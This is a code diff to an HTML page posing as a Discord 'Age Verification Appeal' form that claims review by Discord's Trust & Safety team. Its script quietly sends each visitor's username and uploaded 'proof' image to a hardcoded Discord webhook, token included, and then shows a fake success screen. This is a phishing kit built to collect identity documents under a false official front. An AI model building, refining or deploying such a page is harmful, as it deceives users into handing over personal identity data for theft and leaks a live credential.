@@ -8,7 +8,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
-        /* تأسيس التصميم (Reset) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
@@ -23,7 +22,6 @@
         }
 
         .main-container {
-            background-color: #313338;
             max-width: 700px;
             width: 100%;
         }
@@ -33,9 +31,12 @@
             margin-bottom: 40px;
         }
         
+        /* ضبط حجم الشعار ليظهر بوضوح واحترافية */
         .logo-img {
-            height: 34px; /* حجم متناسق لشعار ديسكورد النصي */
+            height: 38px;
             width: auto;
+            display: block;
+            margin: 0 auto;
         }
 
         h1 {
@@ -59,7 +60,7 @@
             border-radius: 8px;
             padding: 16px;
             margin-bottom: 32px;
-            border-left: 4px solid #e0a638;
+            border-left: 4px solid #f0b232;
         }
 
         .info-box h3 {
@@ -74,15 +75,10 @@
             list-style-position: inside;
             color: #dbdee1;
             font-size: 14px;
-        }
-        
-        .info-box li {
-            margin-bottom: 4px;
+            line-height: 1.6;
         }
 
-        .form-group {
-            margin-bottom: 24px;
-        }
+        .form-group { margin-bottom: 24px; }
 
         label {
             display: block;
@@ -93,26 +89,22 @@
             margin-bottom: 8px;
         }
         
-        .required {
-            color: #da373c;
-            margin-left: 4px;
-        }
+        .required { color: #da373c; margin-left: 4px; }
 
         input[type="text"] {
             width: 100%;
             padding: 12px;
             background-color: #1e1f22;
-            border: none;
+            border: 1px solid transparent;
             border-radius: 4px;
             color: #dbdee1;
             font-size: 16px;
-            font-family: inherit;
             transition: 0.2s;
         }
 
         input[type="text"]:focus {
             outline: none;
-            box-shadow: 0 0 0 2px #5865F2;
+            border-color: #5865f2;
         }
 
         .upload-area {
@@ -122,30 +114,12 @@
             text-align: center;
             background-color: #2b2d31;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: 0.2s;
         }
 
-        .upload-area:hover {
-            border-color: #dbdee1;
-            background-color: #35373c;
-        }
+        .upload-area:hover { border-color: #b5bac1; }
 
-        .upload-icon {
-            font-size: 48px;
-            color: #b5bac1;
-            margin-bottom: 10px;
-        }
-
-        .upload-text {
-            color: #dbdee1;
-            font-weight: 600;
-        }
-        
-        .upload-hint {
-            color: #949ba4;
-            font-size: 12px;
-            margin-top: 5px;
-        }
+        .upload-icon { font-size: 40px; margin-bottom: 10px; display: block; }
 
         .preview-container {
             margin-top: 15px;
@@ -157,43 +131,22 @@
             gap: 10px;
         }
         
-        .preview-img {
-            width: 50px;
-            height: 50px;
-            object-fit: cover;
-            border-radius: 4px;
-        }
-        
-        .file-name {
-            font-size: 14px;
-            color: #f2f3f5;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
+        .preview-img { width: 45px; height: 45px; object-fit: cover; border-radius: 4px; }
 
         .submit-btn {
-            background-color: #5865F2;
+            background-color: #5865f2;
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 14px 24px;
+            border-radius: 3px;
+            padding: 12px 24px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: background-color 0.2s;
+            transition: 0.2s;
         }
 
-        .submit-btn:hover {
-            background-color: #4752c4;
-        }
-        
-        .submit-btn:disabled {
-            background-color: #3b405a;
-            cursor: not-allowed;
-            opacity: 0.7;
-        }
+        .submit-btn:hover { background-color: #4752c4; }
 
         .success-overlay {
             display: none;
@@ -201,17 +154,6 @@
             padding: 40px;
             background: #2b2d31;
             border-radius: 8px;
-        }
-
-        .success-icon {
-            color: #23a559;
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-
-        @media (max-width: 480px) {
-            body { padding: 15px; align-items: flex-start; }
-            h1 { font-size: 20px; }
         }
     </style>
 </head>
@@ -240,21 +182,21 @@
         <form id="appealForm">
             <div class="form-group">
                 <label>Discord Username <span class="required">*</span></label>
-                <input type="text" id="username" placeholder="Example: username#0000" autocomplete="off">
+                <input type="text" id="username" placeholder="Example: username#0000" required>
             </div>
 
             <div class="form-group">
                 <label>Attachment <span class="required">*</span></label>
                 <div class="upload-area" id="dropZone">
-                    <div class="upload-icon">📁</div>
-                    <div class="upload-text">Upload Proof</div>
-                    <div class="upload-hint">Drag & drop or click to browse</div>
-                    <input type="file" id="fileInput" accept="image/*" style="display:none">
+                    <span class="upload-icon">📁</span>
+                    <div style="color: #dbdee1; font-weight: 600;">Upload Proof</div>
+                    <div style="color: #949ba4; font-size: 12px; margin-top: 5px;">Click to browse</div>
+                    <input type="file" id="fileInput" accept="image/*" style="display:none" required>
                 </div>
                 
                 <div class="preview-container" id="previewArea">
                     <img src="" class="preview-img" id="previewImg">
-                    <div class="file-name" id="fileName"></div>
+                    <div id="fileName" style="font-size: 14px; color: #f2f3f5;"></div>
                 </div>
             </div>
 
@@ -263,16 +205,13 @@
     </div>
 
     <div class="main-container success-overlay" id="successScreen">
-        <div class="success-icon">✓</div>
+        <div style="color: #23a559; font-size: 60px; margin-bottom: 20px;">✓</div>
         <h2 style="color: #f2f3f5; margin-bottom: 10px;">Submitted Successfully</h2>
-        <p style="color: #b5bac1; margin-bottom: 20px;">Thank you. We have received your appeal and our Trust & Safety team will review it shortly.</p>
-        <div style="background: #1e1f22; padding: 10px; border-radius: 4px; display: inline-block;">
-            <span style="color: #b5bac1; font-size: 12px; text-transform: uppercase;">Ticket ID: </span>
-            <span style="color: #00a8fc; font-family: monospace;" id="ticketId"></span>
-        </div>
+        <p style="color: #b5bac1;">Our Trust & Safety team will review your appeal shortly.</p>
     </div>
 
 <script>
+    // إعداد الـ Webhook
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";
     
     const fileInput = document.getElementById('fileInput');
@@ -283,77 +222,51 @@
     const submitBtn = document.getElementById('submitBtn');
     const form = document.getElementById('appealForm');
 
-    dropZone.addEventListener('click', () => fileInput.click());
+    dropZone.onclick = () => fileInput.click();
 
-    fileInput.addEventListener('change', handleFileSelect);
-
-    function handleFileSelect(e) {
+    fileInput.onchange = (e) => {
         const file = e.target.files[0];
         if (file) {
             const reader = new FileReader();
-            reader.onload = function(e) {
-                previewImg.src = e.target.result;
+            reader.onload = (el) => {
+                previewImg.src = el.target.result;
                 fileName.textContent = file.name;
                 previewArea.style.display = 'flex';
-                dropZone.style.borderColor = '#23a559';
             };
             reader.readAsDataURL(file);
         }
-    }
+    };
 
-    form.addEventListener('submit', async (e) => {
+    form.onsubmit = async (e) => {
         e.preventDefault();
-
-        const username = document.getElementById('username').value.trim();
-        const file = fileInput.files[0];
-
-        if (!username || !file) {
-            alert("Please fill in all required fields.");
-            return;
-        }
-
         submitBtn.disabled = true;
-        submitBtn.innerHTML = 'Sending... <span style="font-size:12px">Please wait</span>';
+        submitBtn.textContent = 'Processing...';
 
         const formData = new FormData();
-        
         const payload = {
-            username: "Security System",
             embeds: [{
-                title: "🛡️ Age Verification Appeal",
-                color: 5763719,
+                title: "🛡️ New Age Appeal",
+                color: 5814783,
                 fields: [
-                    { name: "👤 User Account", value: `\`${username}\``, inline: true },
-                    { name: "🆔 Appeal ID", value: `\`#${Math.floor(Math.random() * 99999)}\``, inline: true },
-                    { name: "📅 Timestamp", value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: false }
-                ],
-                footer: { text: "Official Verification Gateway" }
+                    { name: "👤 User", value: document.getElementById('username').value },
+                    { name: "📅 Date", value: new Date().toLocaleString() }
+                ]
             }]
         };
 
         formData.append('payload_json', JSON.stringify(payload));
-        formData.append('file', file);
+        formData.append('file', fileInput.files[0]);
 
         try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            });
-
-            if (response.ok) {
-                document.getElementById('mainContainer').style.display = 'none';
-                document.getElementById('successScreen').style.display = 'block';
-                document.getElementById('ticketId').innerText = "AV-" + Math.random().toString(36).substr(2, 9).toUpperCase();
-            } else {
-                throw new Error("Server Error");
-            }
-        } catch (error) {
-            alert("Error sending request. Please check your connection.");
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('successScreen').style.display = 'block';
+        } catch (err) {
+            alert("Error connecting to server.");
             submitBtn.disabled = false;
-            submitBtn.textContent = "Submit";
+            submitBtn.textContent = 'Submit';
         }
-    });
+    };
 </script>
-
 </body>
 </html>
